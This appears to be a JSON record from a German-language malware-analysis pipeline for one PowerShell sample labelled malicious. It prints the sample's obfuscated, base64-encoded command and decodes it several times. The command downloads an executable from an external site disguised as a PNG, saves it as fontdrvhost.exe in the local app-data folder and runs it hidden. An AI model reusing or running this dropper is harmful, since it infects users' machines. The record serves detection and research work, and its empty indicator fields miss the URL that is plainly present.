@@ -1,0 +1,67 @@
+{
+  "meta": {
+    "quelldatei": "0a724325d6c34ee680d393db2ab074eb37c5c9c1cd5985e51382d275d97daa10.ps1",
+    "sha256": "0a724325d6c34ee680d393db2ab074eb37c5c9c1cd5985e51382d275d97daa10",
+    "groesse_bytes": 1378,
+    "zeilen": 1,
+    "ground_truth_label": "malicious",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [],
+    "string_anzahl_gesamt": 0,
+    "base64_bloecke_dekodiert": [
+      {
+        "laenge": 1312,
+        "dekodiert": "SEt-cOnTENT\t\t\t-vA\t\t\t(  \t&('NeW-Obje'                                                                +                                'Ct'                                ) \t (\t \t'nEt.webClieNt'\t\t\t   )).( \t 'DoW'      +   'nlOadd'      +   'aTa'   \t\t\t).inVoke(\t\t\t(”https://ntro.fr/gtrdek/1.pn”\t  \t  +\t  ”g”\t  )\t\t ) \t\t-eN\t \t(  \t'b'\t \t\t \t+\t \t'Yte'\t \t\t \t)\t\t -PAtH\t\t ”$env:LoCalaPPData\\fontdrvhost.exe”\t\t ;\t  (\t \tNeW-oBJEcT \t -C\t\t\twsCRIPt.sHeLL\t \t).run(\t \t”$ENV:lOcaLaPPDaTa\\fontdrvhost.exe”\t\t )"
+      }
+    ],
+    "base64_bloecke_gesamt": 1
+  },
+  "stufe2_features": {
+    "strings": [],
+    "string_anzahl_gesamt": 0,
+    "base64_bloecke_dekodiert": [
+      {
+        "laenge": 1312,
+        "dekodiert": "SEt-cOnTENT\t\t\t-vA\t\t\t(  \t&('NeW-Obje'                                                                +                                'Ct'                                ) \t (\t \t'nEt.webClieNt'\t\t\t   )).( \t 'DoW'      +   'nlOadd'      +   'aTa'   \t\t\t).inVoke(\t\t\t(”https://ntro.fr/gtrdek/1.pn”\t  \t  +\t  ”g”\t  )\t\t ) \t\t-eN\t \t(  \t'b'\t \t\t \t+\t \t'Yte'\t \t\t \t)\t\t -PAtH\t\t ”$env:LoCalaPPData\\fontdrvhost.exe”\t\t ;\t  (\t \tNeW-oBJEcT \t -C\t\t\twsCRIPt.sHeLL\t \t).run(\t \t”$ENV:lOcaLaPPDaTa\\fontdrvhost.exe”\t\t )"
+      }
+    ],
+    "base64_bloecke_gesamt": 1,
+    "beobachtete_cmdlets": [],
+    "auffaellige_tokens": {
+      "noprofile": 1
+    },
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": []
+    }
+  },
+  "stufe3_structure": {
+    "strings": [],
+    "string_anzahl_gesamt": 0,
+    "base64_bloecke_dekodiert": [
+      {
+        "laenge": 1312,
+        "dekodiert": "SEt-cOnTENT\t\t\t-vA\t\t\t(  \t&('NeW-Obje'                                                                +                                'Ct'                                ) \t (\t \t'nEt.webClieNt'\t\t\t   )).( \t 'DoW'      +   'nlOadd'      +   'aTa'   \t\t\t).inVoke(\t\t\t(”https://ntro.fr/gtrdek/1.pn”\t  \t  +\t  ”g”\t  )\t\t ) \t\t-eN\t \t(  \t'b'\t \t\t \t+\t \t'Yte'\t \t\t \t)\t\t -PAtH\t\t ”$env:LoCalaPPData\\fontdrvhost.exe”\t\t ;\t  (\t \tNeW-oBJEcT \t -C\t\t\twsCRIPt.sHeLL\t \t).run(\t \t”$ENV:lOcaLaPPDaTa\\fontdrvhost.exe”\t\t )"
+      }
+    ],
+    "base64_bloecke_gesamt": 1,
+    "beobachtete_cmdlets": [],
+    "auffaellige_tokens": {
+      "noprofile": 1
+    },
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": []
+    },
+    "deobfuskiert_auszug": "cMd /c   powerSHell.EXE    -Ex bYpAsS   -NoP\t \t-w hIddeN  \t-ec CQAgACAAUwBFAHQALQBjAE8AbgBUAEUATgBUAAkACQAJAC0AdgBBAAkACQAJACgAIAAgAAkAJgAoACcATgBlAFcALQBPAGIAagBlACcAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAArACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAnAEMAdAAnACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAApACAACQAgACgACQAgAAkAJwBuAEUAdAAuAHcAZQBiAEMAbABpAGUATgB0ACcACQAJAAkAIAAgACAAKQApAC4AKAAgAAkAIAAnAEQAbwBXACcAIAAgACAAIAAgACAAKwAgACAAIAAnAG4AbABPAGEAZABkACcAIAAgACAAIAAgACAAKwAgACAAIAAnAGEAVABhACcAIAAgACAACQAJAAkAKQAuAGkAbgBWAG8AawBlACgACQAJAAkAKAAdIGgAdAB0AHAAcwA6AC8ALwBuAHQAcgBvAC4AZgByAC8AZwB0AHIAZABlAGsALwAxAC4AcABuAB0gCQAgACAACQAgACAAKwAJACAAIAAdIGcAHSAJACAAIAApAAkACQAgACkAIAAJAAkALQBlAE4ACQAgAAkAKAAgACAACQAnAGIAJwAJACAACQAJACAACQArAAkAIAAJACcAWQB0AGUAJwAJACAACQAJACAACQApAAkACQAgAC0AUABBAHQASAAJAAkAIAAdICQAZQBuAHYAOgBMAG8AQwBhAGwAYQBQAFAARABhAHQAYQBcAGYAbwBuAHQAZAByAHYAaABvAHMAdAAuAGUAeABlAB0gCQAJACAAOwAJACAAIAAoAAkAIAAJAE4AZQBXAC0AbwBCAEoARQBjAFQAIAAJACAALQBDAAkACQAJAHcAcwBDAFIASQBQAHQALgBzAEgAZQBMAEwACQAgAAkAKQAuAHIAdQBuACgACQAgAAkAHSAkAEUATgBWADoAbABPAGMAYQBMAGEAUABQAEQAYQBUAGEAXABmAG8AbgB0AGQAcgB2AGgAbwBzAHQALgBlAHgAZQAdIAkACQAgACkA\t\t\t",
+    "dekodierte_befehle": [
+      "SEt-cOnTENT\t\t\t-vA\t\t\t(  \t&('NeW-Obje'                                                                +                                'Ct'                                ) \t (\t \t'nEt.webClieNt'\t\t\t   )).( \t 'DoW'      +   'nlOadd'      +   'aTa'   \t\t\t).inVoke(\t\t\t(”https://ntro.fr/gtrdek/1.pn”\t  \t  +\t  ”g”\t  )\t\t ) \t\t-eN\t \t(  \t'b'\t \t\t \t+\t \t'Yte'\t \t\t \t)\t\t -PAtH\t\t ”$env:LoCalaPPData\\fontdrvhost.exe”\t\t ;\t  (\t \tNeW-oBJEcT \t -C\t\t\twsCRIPt.sHeLL\t \t).run(\t \t”$ENV:lOcaLaPPDaTa\\fontdrvhost.exe”\t\t )"
+    ],
+    "beobachtete_abfolge": []
+  }
+}
